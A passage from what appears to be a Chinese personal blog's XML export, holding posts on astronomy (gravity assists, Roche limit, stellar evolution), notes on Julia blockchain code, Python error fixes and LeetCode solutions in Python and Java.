<p>总结</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>科学杂谈</title>
    <url>/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>我们都是阴沟里的虫子，但总得有人仰望星空。</p>
<span id="more"></span>
<h2 id="引力弹弓"><a href="#引力弹弓" class="headerlink" title="引力弹弓"></a>引力弹弓</h2><p><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/image-20230221093354438.png" alt="image-20230221093354438" style="zoom:50%;"></p>
<p><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/image-20230221100839912.png" alt="image-20230221100839912" style="zoom:50%;"><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/image-20230221100926302.png" alt="image-20230221100926302" style="zoom:50%;"><br>上图是引力弹弓加速，如果v’向左，即引力弹弓减速。<br><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/image-20230221103153122.png" alt="image-20230221103153122" style="zoom: 67%;"><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/image-20230221104306816.png" alt="image-20230221104306816"><br><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/image-20230221104750769.png" alt="image-20230221104750769"></p>
<p><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/image-20230221110540911.png" alt="image-20230221110540911"><br>飞行器速度：V∞-= V∞+，飞行器改变角度：δ，行星速度：Vp，飞入行星之前的速度：V-，飞出行星之后的速度：V+</p>
<p>引力弹弓常使用于超过宇宙速度，故飞行器从飞入到飞出的速度大小是没有变化的，只不过因为行星引力的影响，飞行器相对于行星的飞行速度方向发生了变化，但是对于太阳来说速度发生了很大的变化。</p>
<p>飞行器获得的线性动量在数值上等同于行星失去的线性动量，不过由于行星的巨大质量，使得这种损失对其速度的影响可以忽略不计，所以引力弹弓并不违背能量守恒和动量守恒定律。</p>
<p>规律1：近距离掠过行星时，轨迹改变更显著<br>规律2：沿行星运动的方向脱离的飞行器速度最大，与行星运行速度相反脱离的速度最小</p>
<p>第一艘借助引力助推到达另一颗行星(水星)的探测器是水手10号。</p>
<p>上世纪70年代出现每176年出现的木星、土星、天王星、海王星向太阳系同一侧靠拢的情况，NASA提出“壮丽旅程”(Grand Tour)计划，旅行者一号、二号依次拜访太阳系四颗巨态气行星。<br>旅行者一号拍下了“暗淡蓝点”<br><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/3-1581740691.jpeg" alt="“暗淡蓝点”拍摄30周年"></p>
<h2 id="洛希极限"><a href="#洛希极限" class="headerlink" title="洛希极限"></a>洛希极限</h2><p>美丽的土星环    图：NASA</p>
<p><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/image-20230221112959112.png" alt="image-20230221112959112"></p>
<p>洛希极限是一个天体自身的重力与第二个天体造成的==潮汐力==相等时二者的距离。如果二者之间的距离小于这个洛希极限值，那么较小的这个天体就会被倾向于碎散或者被撕裂，继而成为母天体的环。</p>
<h3 id="潮汐力"><a href="#潮汐力" class="headerlink" title="潮汐力"></a>潮汐力</h3><p>根据广义相对论，行星之间互相的引力作用会随着距离的缩短而增大，也就是二者离得越近引力强度越大。那么自然，天体之间的相对面要比背对面受到的引力作用大一些（想象一下，天体a之于天体b的最近端和最远端两个点距离的差，就是过这两点的天体的“直径”）。这时远近两端受到的引力差就被称作“潮汐力”，也叫“差动力”。地球上的潮汐现象就是受到地月系统之间的潮汐力造成的。</p>
<p>另外还要考虑天体是流体还是刚体，还有他们的密度体积也与之相关。刚体的洛希极限要近点，流体远些。</p>
<p><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/image-20230221113616158.png" alt="image-20230221113616158"></p>
<p>注：洛希极限值以内的天体不一定会被撕裂，需要考虑其他引力因素以及体积、成分、内部构造、物质和密度的分布等等，如 木卫十六和土卫十八，均在洛希极限内，但未被撕裂。</p>
<h3 id="希尔球"><a href="#希尔球" class="headerlink" title="希尔球"></a>希尔球</h3><p>希尔球，简单的说就是一颗天体的引力控制范围，也是能够捕获外来天体的一个范围。</p>
<p>希尔球是美国天文学家乔治·威廉·希尔以法国天文学家爱德华·洛希的工作为基础所定义的，所以它有时也被称为洛希球。</p>
<p>太阳系已知所有天体的卫星包括行星在内都位于母体星的希尔球内，如地球在太阳的希尔球内，月亮在地球的希尔球内。流浪计划中的逃离太阳系，也就是要冲出太阳的希尔球才行。</p>
<p>所以利用引力弹弓需要距离介于洛希极限与希尔球范围之间的距离。</p>
<h3 id="刚体洛希极限"><a href="#刚体洛希极限" class="headerlink" title="刚体洛希极限"></a>刚体洛希极限</h3><p><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/image-20230221093956002.png" alt="image-20230221093956002" style="zoom: 33%;"></p>
<p><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/image-20230221114723779.png" alt="image-20230221114723779"></p>
<p>u会受到两种力：卫星对u的引力和主星对u的潮汐力。卫星对u的引力可通过万有引力定律表示。<script type="math/tex">F_G=\frac{Gmu}{r^2}</script></p>
<p>潮汐力是靠近主要卫星边缘的引力的差异导致的：<script type="math/tex">F_T=\frac{GMu}{(d-r)^2}-\frac{GMu}{d^2}</script></p>
<p>由于一般情况下：r&lt;&lt;R，R&lt;d，分母可以近似调整一下，得到下面的式子。</p>
<script type="math/tex; mode=display">F_T=\frac{2GMur}{d^3}</script><p>当引力和潮汐力相互平衡时，达到了洛希极限。<script type="math/tex">F_G=F_T</script></p>
<p>因此：<script type="math/tex">\frac{Gmu}{r^2}=\frac{2GMur}{d^3}</script></p>
<script type="math/tex; mode=display">d = r(2\frac{M}{m})^{\frac{1}{3}}</script><p>由于质量可以改成密度与体积的乘积。上面的式子还可以进行调整。</p>
<script type="math/tex; mode=display">
M=\frac{4\pi\rho _MR^3}{3}\quad m=\frac{4\pi\rho _mr^3}{3}\\
d=r(\frac{2\rho _MR^3}{\rho _mr^3})^{\frac{1}{3}}</script><p>消去共同因数后可以得到简易的刚体洛希极限表达式。</p>
<script type="math/tex; mode=display">
d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/image-20230221120416112.png" alt="image-20230221120416112"></p>
<h3 id="流体洛希极限"><a href="#流体洛希极限" class="headerlink" title="流体洛希极限"></a>流体洛希极限</h3><p><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/image-20230221114235337.png" alt="image-20230221114235337"></p>
<h2 id="太阳系"><a href="#太阳系" class="headerlink" title="太阳系"></a>太阳系</h2><p>以太阳为中心和所有受到太阳约束天体的集合体</p>
<p>地球到太阳的平均距离为149,597,900km，这个距离就叫做一个天文单位，符号AU<br><img src="/2023/02/21/%E7%A7%91%E5%AD%A6%E6%9D%82%E8%B0%88/image-20230221145311639.png" alt="image-20230221145311639"></p>
<p>海王星和太阳的平均距离大约是三十个天文单位。<br>柯伊博带：在海王星轨道外黄道面附近天体密集的中空圆盘状区域。<br>距离太阳30-500天文单位区域被认为是短周期彗星比如哈雷彗星的来源。<br>奥尔特云：目前认为的太阳系边界，一个假设包围着太阳系的球体云团，距离太阳五万到十万个天文单位，约为一个光年。</p>
<h2 id="赫罗图"><a href="#赫罗图" class="headerlink" title="赫罗图"></a>赫罗图</h2><p><img src="http://img.mp.itc.cn/upload/20161206/5ad733c05b9d4aa68464e797051ccc2d_th.jpg" alt="img"></p>
<p><img src="http://img.mp.itc.cn/upload/20161206/c13e32ec78d34864bd788ddc840d3309_th.jpg" alt="img"></p>
<p>主星序：左上到右下的90%的恒星都在此类</p>
<h3 id="引力坍缩"><a href="#引力坍缩" class="headerlink" title="引力坍缩"></a>引力坍缩</h3><p>恒星诞生于星际尘埃和气体构成的巨型星云。星云中的粒子通常状态下以高速随机运动，彼此间的引力不足以将他们压缩到一起，但当条件允许时，比如附近的超新星爆发或发生激变事件，这些星云被足够强的压力压缩，以致引力能克服粒子的运动向一处靠拢，于是星云开始引力坍缩的过程。</p>
<h3 id="巨分子云"><a href="#巨分子云" class="headerlink" title="巨分子云"></a>巨分子云</h3><p>由于角动量守恒的制约，从原先庞大的星云中分离出来更小的更致密的星云，这个过程称为==引力凝聚==。</p>
<h3 id="原恒星"><a href="#原恒星" class="headerlink" title="原恒星"></a>原恒星</h3><p>同时坍缩的能量转换为内能，在内部产生向外的辐射压来平衡向内的引力来逐步减缓并终止引力坍缩。</p>
<p>当辐射压与引力平衡时，就会坍缩成具有一定密度的球体。</p>
<p>原恒星形成之后会落在赫罗图的主星序的特定点上，也就是步入幼年，演化过程只和质量和元素丰度有关。</p>
<p>当氢燃烧完后，恒星会停止核反应留下一个氦核，恒星的外壳开始引力坍缩，核心的压力和温度就会升高。</p>
<p>如果恒星质量小于0.5个太阳质量，就不能产生氦聚变所需温度，会逐渐冷却变成一颗氦白矮星。0.5-2.3倍太阳质量的恒星，核心温度会达到一亿开以上，核心会开始进行氦聚变，外层不断膨胀，变成一颗红巨星。</p>
<h3 id="氦闪"><a href="#氦闪" class="headerlink" title="氦闪"></a>氦闪</h3><p>太阳在红巨星状态下，氦核受到外部的压强大到一定程度，电磁力不足以抵抗引力，核心的电子被压成==简并态==，以简并压力与引力抗衡，而不是以热压力阻挡引力坍缩。处于简并态的氦的体积不会随着温度的升高而膨胀，因此氦核的温度就会持续升高，这会进一步提升氦聚变的速率和反应区域，但不会增压力，所以核心就不会稳定的扩张和冷却，由此引发热失控的反应会使恒星释放出大量能量，直到增加的温度可以忽略掉简并压力，使热压力再度掌握优势，这个过程就是氦闪。</p>
<p>理想气体的物态方程中，压强p与温度T和体积v都有关系，而在简并气体方程中，p只与v有关，与t无关。在氦闪发生前一段时间，由于核心放出的能量越来越少，在引力作用下，v越来越小至简并态同时温度继续上升。但是此时温度还不够发生氦聚变，于是在引力作用下v继续减小 p逐渐增加。如果在达到氦聚变温度前内外压力平衡，就会形成白矮星。如果在到达氦仍然没有达到平衡，就会发生氦聚变。此时由于核心处于简并态，氦发生的聚变能量不会使核心体积增加只会使温度上升，但是氦聚变的反应速率又和温度成正比，而且处于简并态的核心的热容量几乎为零，热传导和热容量成反比。于是就会发生以下循环:氦原子聚变产生热量→生成的热量无法产生体积功全部转化为内能，使温度升高→极高的导热率使核心温度迅速上升加速氦原子聚变→聚变产生热量。这个正反馈循环能在短时间产生巨大能量直至核心回到非简并态，最后将产生的能量抛出去，这就是氦闪。</p>
<h3 id="简并态"><a href="#简并态" class="headerlink" title="简并态"></a>简并态</h3><p>电子简并态就是原子中电子全部被压缩到低能级轨道，可以理解成电子都在原子核附近了，原子的体积会大幅度缩小，但是物质结构还是正常的，当核心都压缩到电子简并时，会将外壳物质全部抛出，看起来就像爆炸，也就是所谓的闪。如果质量再大一点，电子简并压力已经不够对抗万有引力，电子会被压缩到质子中成为中子，物质结构已经完全破坏，只剩下单纯的一堆中子，体积会超大幅度压缩，最后就是成为中子星，如果中子简并压都无法克服万有引力，大概率就是成为黑洞了</p>
<h3 id="太阳的演化"><a href="#太阳的演化" class="headerlink" title="太阳的演化"></a>太阳的演化</h3><p>红巨星外壳向外膨胀，核心向内压缩，产生将氦聚变成碳的核反应，聚变会重新产生能量来延缓死亡过程，过程大概持续十亿年。</p>
<p>因为氦的燃烧对温度极其敏感很不稳定，巨大的波动会使得外壳获得足够的动能脱离恒星成为行星状星云，行星状星云中心留下的核心会逐渐冷却，成为小而致密的碳氧白矮星。</p>
<h3 id="钱德拉塞卡极限"><a href="#钱德拉塞卡极限" class="headerlink" title="钱德拉塞卡极限"></a>钱德拉塞卡极限</h3><p>2.3-8倍太阳质量恒星演化过程与太阳类似，不同的是如果最后的白矮星通过引力吸取周围的物质到达太阳质量的1.4倍，会发生超新星爆发，这个临界值被称作钱德拉塞卡极限。</p>
<p>这种类型的超新星爆发通常出现在双星系统中。</p>
<h3 id="大质量恒星"><a href="#大质量恒星" class="headerlink" title="大质量恒星"></a>大质量恒星</h3><p>大于等于8倍太阳质量的恒星在膨胀成超巨星之后，核心继续被压力压缩，温度和密度上升就会继续聚变反应，会生成越来越重的元素，生产的能量会延缓坍缩过程，当聚变逐步到达元素周期表的下层，就是硅聚变成铁，但是铁不能据徐释放能量，相反铁会发生==光致分解==这个过程会吸收大量能量，这会造成没有能量来对抗引力，核心几乎瞬间坍缩，会在几分之一秒内造成一次剧烈的超新星爆发，和轻与铁的元素同时被抛出的中微子形成一个冲击波，在被抛出的物质吸收后形成一些比铁重的放射性元素，重元素中一部分通过这种方式形成，其他可能通过宇宙大爆炸形成。</p>
<p>8-30个太阳质量的恒星在超新星爆发后会形成一颗中子星</p>
<p>超过30个太阳质量的恒星在超新星爆发后就会形成黑洞</p>
]]></content>
      <categories>
        <category>科学</category>
      </categories>
      <tags>
        <tag>爱好</tag>
      </tags>
  </entry>
  <entry>
    <title>julia构建区块链</title>
    <url>/2023/04/24/julia%E6%9E%84%E5%BB%BA%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">JSON.print(<span class="literal">stdout</span>, blockchain.chain[<span class="keyword">end</span>], <span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>这个函数将 <code>blockchain.chain</code> 数组的最后一个区块（也就是区块链中最新的区块）以格式化的 JSON 字符串的形式打印到控制台。具体来说，<code>JSON.print()</code> 函数的第一个参数 <code>stdout</code> 表示输出到标准输出流（通常是控制台），第二个参数 <code>blockchain.chain[end]</code> 表示要打印的数据，第三个参数 <code>4</code> 表示缩进层级为 4。</p>
<p>通过这个函数，我们可以查看当前最新的区块的详细信息，包括区块头、交易数据等。这在调试和测试区块链时非常有用。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">!(isnothing(prev_hash)) ? prev_hash : hash<span class="constructor">_block(<span class="params">blockchain</span>.<span class="params">chain</span>[<span class="params">end</span>])</span></span><br></pre></td></tr></table></figure>
<p>这是一个三元条件运算符，也称为三元表达式，它的形式如下：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">条件 ? 如果条件为真时执行的表达式 : 如果条件为假时执行的表达式</span><br></pre></td></tr></table></figure>
<p>在这个特定的表达式中，条件是 <code>!(isnothing(prev_hash))</code>，意思是如果 <code>prev_hash</code> 不是 <code>nothing</code>，也就是有值，那么执行 <code>prev_hash</code>，否则执行 <code>hash_block(blockchain.chain[end])</code>。这个表达式可以简单理解为：如果 <code>prev_hash</code> 有值，就使用它；如果没有值，就计算最后一个区块的哈希值作为上一个区块的哈希值。</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">block_str</span> = <span class="variable">JSON.json</span>(<span class="function"><span class="title">SortedDict</span>(<span class="variable">block</span>))</span></span><br><span class="line"><span class="variable">return</span> <span class="function"><span class="title">bytes2hex</span>(<span class="title">sha256</span>(<span class="variable">block_str</span>))</span></span><br></pre></td></tr></table></figure>
<p>这段代码的作用是将区块对象（block）转换成有序字典（SortedDict）形式的JSON字符串，然后对该字符串进行SHA256哈希，最后将哈希值转换成十六进制字符串返回。这个哈希值可以用来作为区块的ID或者签名，确保区块的完整性和不可篡改性。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">resp_json</span> = JSON.parse(String(resp.body))</span><br><span class="line"><span class="attr">len</span> = resp_json[<span class="string">&quot;length&quot;</span>]</span><br><span class="line"><span class="attr">chain</span> = resp_json[<span class="string">&quot;chain&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>这一行代码从HTTP响应的主体（body）中解析出JSON格式的数据，并将其存储在一个Julia中的数据结构中。<code>JSON.parse</code>函数将JSON字符串转换为相应的Julia数据结构。在这个例子中，<code>resp.body</code>是一个字符串类型，因此需要将其转换为一个Julia字符串。最终结果将是一个包含在<code>resp.body</code>中的JSON格式数据的Julia数据结构，可以使用这些数据进行后续的操作。</p>
<p>这行代码从解析出来的JSON响应中获取了键为“chain”的值，并将其赋值给变量“chain”。假设“resp_json”是以下格式的JSON对象：</p>
<p>{ “length”: 3, “chain”: [ {“index”: 1, “timestamp”: 1234567890, “transactions”: [], “nonce”: 12345, “previous_hash”: “abc123”}, {“index”: 2, “timestamp”: 1234567891, “transactions”: [], “nonce”: 67890, “previous_hash”: “def456”}, {“index”: 3, “timestamp”: 1234567892, “transactions”: [], “nonce”: 24680, “previous_hash”: “ghi789”} ] }</p>
<p>则“chain”变量将是一个由三个块对象组成的数组。</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">floor(<span class="name">Int64</span>,(<span class="name">Dates</span>.datetime2unix(<span class="name">Dates</span>.now())))</span><br></pre></td></tr></table></figure>
<p>这段代码是获取当前时间的 Unix 时间戳，具体实现如下：</p>
<p>首先 <code>Dates.now()</code> 获取当前时间，返回 <code>DateTime</code> 类型的对象。</p>
<p>然后 <code>Dates.datetime2unix()</code> 将 <code>DateTime</code> 类型转化为 Unix 时间戳。</p>
<p>最后 <code>floor(Int64, ...)</code> 对 Unix 时间戳向下取整并转化为 <code>Int64</code> 类型。</p>
<p>这样就可以得到当前的 Unix 时间戳，以秒为单位</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">blockchain = <span class="built_in">Blockchain</span>(<span class="selector-attr">[]</span>, <span class="selector-attr">[]</span>, <span class="built_in">Set</span>())</span><br></pre></td></tr></table></figure>
<p>这段代码创建了一个空的 <code>Blockchain</code> 对象，其中参数包括三个空数组和一个空的集合，分别对应该区块链的链、当前交易列表、已知节点集合。<br>在这个实现中，已知节点集合使用<code>Set()</code>主要是为了避免在集合中出现重复的节点。<code>Set()</code>是一种集合数据结构，它只包含不同的元素，每个元素只出现一次，而不会有重复元素。这样做可以确保我们的节点集合不会包含重复的节点，从而避免在节点之间传输信息时出现重复的数据。同时，<code>Set()</code>也具有高效的添加、删除和查找元素的操作，使得我们可以方便地维护我们的节点集合。</p>
]]></content>
  </entry>
  <entry>
    <title>python学习</title>
    <url>/2023/03/28/python%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>python中遇到的各种错误</p>
<span id="more"></span>
<h2 id="IndexError"><a href="#IndexError" class="headerlink" title="IndexError"></a>IndexError</h2><h3 id="list-assignment-index-out-of-range"><a href="#list-assignment-index-out-of-range" class="headerlink" title="list assignment index out of range"></a>list assignment index out of range</h3><p>列表超过限制</p>
<p>源代码</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">Solution</span>(<span class="symbol">object</span>):</span><br><span class="line">    <span class="symbol">def</span> <span class="symbol">fizzBuzz</span>(<span class="symbol">self, <span class="symbol">n</span></span>):</span><br><span class="line">        <span class="symbol">answer</span> = []</span><br><span class="line">        <span class="symbol">for</span> <span class="symbol">i</span> <span class="symbol">in</span> <span class="symbol">range</span> (<span class="symbol">1,<span class="symbol">n</span></span>+<span class="symbol">1</span>):</span><br><span class="line">            <span class="symbol">s</span> = &quot;&quot;</span><br><span class="line">            <span class="symbol">if</span> <span class="symbol">i</span> % <span class="symbol">3</span> == <span class="symbol">0:</span></span><br><span class="line"><span class="symbol">                <span class="symbol">s</span></span> += &quot;<span class="symbol">Fizz</span>&quot;</span><br><span class="line">            <span class="symbol">if</span> <span class="symbol">i</span> % <span class="symbol">5</span> == <span class="symbol">0:</span></span><br><span class="line"><span class="symbol">                <span class="symbol">s</span></span> += &quot;<span class="symbol">Buzz</span>&quot;</span><br><span class="line">            <span class="symbol">if</span> <span class="symbol">s</span> == &quot;&quot;:</span><br><span class="line">                <span class="symbol">s</span> = <span class="symbol">str</span>(<span class="symbol">i</span>)</span><br><span class="line">            <span class="symbol">answer</span>[<span class="symbol">i</span>] = <span class="symbol">s</span></span><br><span class="line">        <span class="symbol">return</span> <span class="symbol">answer</span></span><br></pre></td></tr></table></figure>
<p>报错信息</p>
<p><img src="/2023/03/28/python%E5%AD%A6%E4%B9%A0/image-20230328234402772.png" alt="image-20230328234402772"></p>
<p>原因分析</p>
<p>因为设置了空数组answer[]，所以进行for循环时，无论n为几，都会返回错误信息，即出现下标越界。</p>
<p>解决方法</p>
<p>使用<code>.append()</code>方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fizzBuzz</span>(<span class="params">self, n</span>):</span><br><span class="line">        answer = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">            s = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">&quot;Fizz&quot;</span></span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">&quot;Buzz&quot;</span></span><br><span class="line">            <span class="keyword">if</span> s == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                s = <span class="built_in">str</span>(i)</span><br><span class="line">            answer.append(s)</span><br><span class="line">        <span class="keyword">return</span> answer</span><br></pre></td></tr></table></figure>
<h2 id="TypeError"><a href="#TypeError" class="headerlink" title="TypeError"></a>TypeError</h2><h3 id="‘ListNode’-object-does-not-support-indexing"><a href="#‘ListNode’-object-does-not-support-indexing" class="headerlink" title="‘ListNode’ object does not support indexing"></a>‘ListNode’ object does not support indexing</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(object):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">middleNode</span>(<span class="params"><span class="variable language_">self</span>, head</span>):</span><br><span class="line">        <span class="keyword">while</span> head[-<span class="number">1</span>].<span class="keyword">next</span> != <span class="title class_">None</span>:</span><br><span class="line">            head.append(head[-<span class="number">1</span>].<span class="keyword">next</span>)</span><br><span class="line">        <span class="keyword">return</span> head[len(head)/<span class="number">2</span>]</span><br></pre></td></tr></table></figure>
<p>原因分析</p>
<p>在遍历链表过程中不可以用head来遍历列表，否则会丢失列表的一些结点</p>
<p>解决方案</p>
<p>使用和head相同类型的临时指针变量，如</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">n,<span class="keyword">a</span> = <span class="number">0</span>,head</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">a</span>:</span><br><span class="line">	n += <span class="number">1</span></span><br><span class="line">    <span class="keyword">a</span> = <span class="keyword">a</span>.next</span><br></pre></td></tr></table></figure>
<p>或使用数组来代替head，如<code>a = [head]</code></p>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode</title>
    <url>/2023/03/28/leetcode/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>leetcode练习题</p>
<span id="more"></span>
<h3 id="1480-一维数组的动态和"><a href="#1480-一维数组的动态和" class="headerlink" title="1480.一维数组的动态和"></a>1480.一维数组的动态和</h3><p>给你一个数组 nums 。数组「动态和」的计算公式为：runningSum[i] = sum(nums[0]…nums[i]) 。请返回 nums 的动态和。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution(object):</span><br><span class="line">    def runningSum(self, nums:List[int])-&gt;List[int]:</span><br><span class="line">        n = len(nums)</span><br><span class="line">        if n &lt; 1:</span><br><span class="line">            return nums[0]</span><br><span class="line">        for i in range(1,n):</span><br><span class="line">            nums[i] += nums[i-1]</span><br><span class="line">        return nums</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">runningSum</span>(<span class="params">self, nums</span>):</span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">            nums[i] += nums[i-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> nums</span><br></pre></td></tr></table></figure>
<h3 id="1342-将数字变成0的操作次数"><a href="#1342-将数字变成0的操作次数" class="headerlink" title="1342.将数字变成0的操作次数"></a>1342.将数字变成0的操作次数</h3><p>给你一个非负整数 <code>num</code> ，请你返回将它变成 0 所需要的步数。 如果当前数字是偶数，你需要把它除以 2 ；否则，减去 1 。</p>
<p>笨比解法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">numberOfSteps</span>(<span class="params">self, num</span>):</span><br><span class="line">        step = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> num != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                num = num/<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                num -= <span class="number">1</span></span><br><span class="line">            step = step + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> step</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numberOfSteps</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (num != <span class="number">0</span> &amp;&amp; ++ans &gt;= <span class="number">0</span>) num = num % <span class="number">2</span> == <span class="number">0</span> ? num / <span class="number">2</span> : num - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>位运算</p>
<p>思路与算法：将 <em>num</em> 与 11 进行位运算来判断 <em>num</em> 的奇偶性。<br>记录操作次数时：<br>如果 num 是奇数，我们需要加上一次减1的操作。如果 num&gt;1，我们需要加上一次除以 2的操作。<br>然后使 <em>num</em> 的值变成$\frac{ ⌊num⌋}{2}$。重复以上操作直到<em>num</em>=0 时结束操作.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">numberOfSteps</span>(<span class="params">self, num</span>):</span><br><span class="line">        step = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> num != <span class="number">0</span>:</span><br><span class="line">            step += num &amp; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> num &gt; <span class="number">1</span>:</span><br><span class="line">                step += <span class="number">1</span></span><br><span class="line">            num &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> step</span><br></pre></td></tr></table></figure>
<p>数学（二进制性质）</p>
<p>总的操作次数为 = 右移次数 + 消减次数 ：<br>右移次数：num 中最高位1的所在的位置；<br>消减次数：num 中1的个数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numberOfSteps</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Math.max(getLoc(num) + getCnt(num) - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getLoc</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">31</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((x &gt;&gt; i) &amp; <span class="number">1</span>) == <span class="number">1</span>) <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>; <span class="comment">// 